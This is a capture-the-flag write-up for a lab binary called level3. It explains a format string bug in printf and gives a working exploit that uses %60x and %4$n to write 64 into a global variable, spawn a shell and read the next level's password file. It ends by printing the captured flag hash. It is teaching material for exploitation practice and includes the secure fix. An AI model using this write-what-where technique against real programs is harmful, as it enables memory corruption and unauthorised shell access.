# 🎯 Level3 - Format String Vulnerability

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Welcome to format string exploitation! 🎨

## 📋 Binary Analysis

### 🎯 V Function (Decompiled)
```c
void v(void)
{
  char local_20c [520];
  
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);              // ⚠️ FORMAT STRING VULNERABILITY!
  if (m == 0x40) {                // If m equals 64
    fwrite("Wait what?!\n", 1, 0xc, stdout);
    system("/bin/sh");            // Spawn shell!
  }
  return;
}
```

### 🔑 Global Variable
```asm
m                                    XREF[2]: Entry Point(*), v:080484da(R)  
0804988c    00 00 00 00    undefined4    00000000h
```

**Address of `m`**: `0x0804988c`

## 🚨 Vulnerability

### The Problem
```c
printf(local_20c);  // ❌ WRONG! No format specifier
```

**Should be**:
```c
printf("%s", local_20c);  // ✅ CORRECT
```

### What This Allows
- 🔍 **Memory disclosure**: Read values from the stack using `%x`, `%p`, `%s`
- ✍️ **Memory write**: Modify arbitrary memory using `%n`
- 🎯 **Goal**: Modify global variable `m` to equal `0x40` (64)

## 🎯 How the Exploit Works

### What Makes This Different

**Levels 1 & 2**: Control flow hijacking (overflow to control EIP)  
**Level 3**: Arbitrary memory write (use format string to modify data)

| Aspect | Level1/2 | Level3 |
|--------|----------|--------|
| **Vulnerability** | Buffer overflow | Format string |
| **Target** | Return address (EIP) | Global variable (m) |
| **Technique** | Overflow buffer | Abuse `%n` specifier |
| **Goal** | Redirect execution | Write value to memory |

### Understanding Format Strings

**Normal (safe) printf:**
```c
printf("%s", buffer);
      ↑      ↑
   format   data
   (fixed)  (user input)
```

**Vulnerable printf:**
```c
printf(buffer);
       ↑
    User controls format string!
```

When user controls the format string, they can inject specifiers like `%x`, `%n` to read/write memory.

### How printf() Reads the Stack

```c
printf("%x %x %x", arg1, arg2, arg3);
```

**Stack layout:**
```
Stack:
├─────────────────┐
│ arg3            │ ← 3rd %x reads this
├─────────────────┤
│ arg2            │ ← 2nd %x reads this
├─────────────────┤
│ arg1            │ ← 1st %x reads this
├─────────────────┤
│ format string   │
│ pointer         │
└─────────────────┘
```

**In our vulnerable case:**
```
printf(buffer);  // buffer = "AAAA%x%x%x"
```

Stack contains our input buffer, so `%x` specifiers read values from the stack, eventually reaching our "AAAA"!

### The %n Specifier - Write Primitive

**What %n does:**
```c
int count;
printf("Hello%n", &count);
//      ↑    ↑     ↑
//      5    writes count = 5
//    bytes   
```

`%n` writes the **number of bytes printed so far** to the address provided.

**In format string attack:**
1. Place target address on stack (in our input)
2. Use `%n` to write to that address
3. Control byte count to write desired value

### The Attack Strategy

**Step 1: Find Our Input on Stack**
```bash
Input: "AAAA%x%x%x%x"
Output: AAAA200b7fd1ac0b7ff37d041414141
                                ^^^^^^^^
                            Our "AAAA" at position 4!
```

**Step 2: Place Target Address**
```
Input: "\x8c\x98\x04\x08" + format_specifiers
              ↓
       Address of 'm' (0x0804988c)
```

This address is now at **stack position 4**.

**Step 3: Control Byte Count**
```
Goal: Write 64 to 'm'
Solution: Print 64 bytes total before %n
```

Calculation:
- Address: 4 bytes (already in input)
- Need: 60 more bytes
- Use: `%60x` (prints hex value padded to 60 chars)
- Total: 4 + 60 = 64 bytes ✅

**Step 4: Write with %4$n**
```
%4$n → Write byte count to address at position 4
```

Since position 4 contains `0x0804988c` (address of m), this writes `64` to `m`!

### Visual: Complete Execution Flow

```
Input: "\x8c\x98\x04\x08" + "%60x" + "%4$n"
             └────┬────┘      │       └─┬─┘
                  │           │         │
                  ↓           ↓         ↓
Stack Position:  [addr]   [padding]  [write]

printf() processing:
  Step 1: Print "\x8c\x98\x04\x08"  → 4 bytes printed
  Step 2: Process %60x              → 60 more bytes (total: 64)
          └─ Prints stack value in 60-char width
  Step 3: Process %4$n              → Write 64 to address at pos 4
          └─ Position 4 = 0x0804988c (address of m)
          
Memory at 0x0804988c (variable m):
  Before: 0x00000000
  After:  0x00000040  (64 in decimal) ✅
  
Condition check:
  if (m == 0x40)  → TRUE
  
Result: system("/bin/sh") executes! 🎉
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Format string bug** | ✅ | `printf(buffer)` lets us inject specifiers |
| **Stack control** | ✅ | Our input appears at stack position 4 |
| **Known target** | ✅ | Global `m` at `0x0804988c` (from Ghidra) |
| **Writable memory** | ✅ | Global variables are in writable section |
| **%n works** | ✅ | printf supports %n write primitive |

### Key Insight

Unlike buffer overflows that **redirect execution**, format string attacks allow **arbitrary memory writes**. We write the value `64` directly to the global variable `m`, triggering the condition that spawns a shell.

## 💣 Exploit Strategy

### Step 1: Find Stack Position 🔎
```bash
python -c 'print "AAAA" + "%x."*10' | ./level3
```

**Output**:
```
AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78...
                            ^^^^^^^^
                         Position 4!
```

### Step 2: Understand Format String Primitives

| Specifier | Description |
|-----------|-------------|
| `%x` | Print hexadecimal from stack |
| `%p` | Print pointer from stack |
| `%s` | Print string from pointer on stack |
| `%n` | **Write** number of bytes printed to address on stack |
| `%4$n` | Write to 4th argument (direct parameter access) |

### Step 3: Calculate Payload 🧮

```
[Address: 4 bytes] + [Padding: 60 bytes] = 64 bytes total (0x40)
      ↓                    ↓                      ↓
 0x0804988c           %60x                    %4$n
```

**Breakdown**:
- `\x8c\x98\x04\x08` → Address of `m` (little-endian)
- `%60x` → Print 60 hex characters (padding)
- `%4$n` → Write byte count (64) to 4th stack position

### Step 4: Execute Exploit 💥
```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60x%4$n"'; cat) | ./level3
```

**What Happens**:
1. Address of `m` is placed at stack position 4
2. `%60x` prints 60 characters → total bytes = 4 + 60 = 64
3. `%4$n` writes 64 to the address at position 4 (which is `m`)
4. `m == 0x40` condition is true → shell spawns! 🎉

### Step 5: Get the Flag 🚩
```bash
cat /home/user/level4/.pass
```

---

> 💡 **Pro Tip**: Always use `printf("%s", buffer)` instead of `printf(buffer)`!

> ⚠️ **Security Note**: Format string bugs were extremely common in the 90s/2000s and led to many exploits!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
